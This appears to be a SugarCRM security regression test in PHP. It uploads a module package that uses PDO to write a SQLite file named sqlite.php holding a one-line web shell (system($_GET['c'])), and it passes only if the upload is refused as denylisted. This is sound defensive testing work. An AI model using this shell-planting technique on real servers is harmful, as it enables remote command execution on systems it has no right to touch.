<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\Helpers\MLPBuilder;
use Regression\Severity;
use Regression\SugarCRMAssessment;

class PDOAssessment extends SugarCRMAssessment
{
    public function getSeverity(): ?string
    {
        return Severity::HIGH;
    }

    public function getAssessmentDescription(): string
    {
        return 'PDO allows the creation of .php files';
    }

    public function run(): void
    {
        $this
            ->login('admin', 'asdf')
            ->bwcLogin();

        $mlpBuilder = (new MLPBuilder(static::$sugarVersion['sugar_version'], 'manifest_shell'))
            ->addFile(
                'test.php',
                <<<'PHP'
                <?php
                try {
                    // Connect to the SQLite Database.
                    $db = new PDO('sqlite:sqlite.php');
                    $sql =<<<EOF
                        CREATE TABLE COMPANY
                        (ID INT PRIMARY KEY     NOT NULL,
                        CODE           TEXT    NOT NULL
                        );
                    EOF;
                    $ret = $db->exec($sql);
                    $code = <<<'SHELL'
                        <?php
                        system($_GET['c']);
                        ?>
                    SHELL;
                
                        $qry = $db->prepare(
                            'INSERT INTO company (id, code) VALUES (1, ?)');
                        $qry->execute(array($code));
                
                    } catch(Exception $e) {
                        die('connection_unsuccessful: ' . $e->getMessage());
                    }
                PHP,
                'manifest.php'
            )
            ->build();

        $this
            ->uploadMLP($mlpBuilder->getPath())
            ->assumeSubstring('Code attempted to instantiate denylisted class "PDO"', $uploadFailed)
            ->checkAssumptions('PDO is allowed', !$uploadFailed);
    }
}
